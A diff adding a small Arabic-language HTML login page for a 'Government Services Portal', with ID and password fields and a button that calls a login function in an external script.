@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بوابة الخدمات الحكومية</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="login-container">
+  <div class="login-box">
+    <div class="logo">
+      🏛️ بوابة الخدمات الحكومية
+    </div>
+    <h2>تسجيل الدخول</h2>
+    
+    <div class="input-group">
+      <span class="icon">🆔</span>
+      <input id="id" type="text" placeholder="الهوية">
+    </div>
+
+    <div class="input-group">
+      <span class="icon">🔒</span>
+      <input id="pass" type="password" placeholder="كلمة المرور">
+    </div>
+
+    <button onclick="login()">دخول</button>
+    <p id="err" class="error-msg"></p>
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
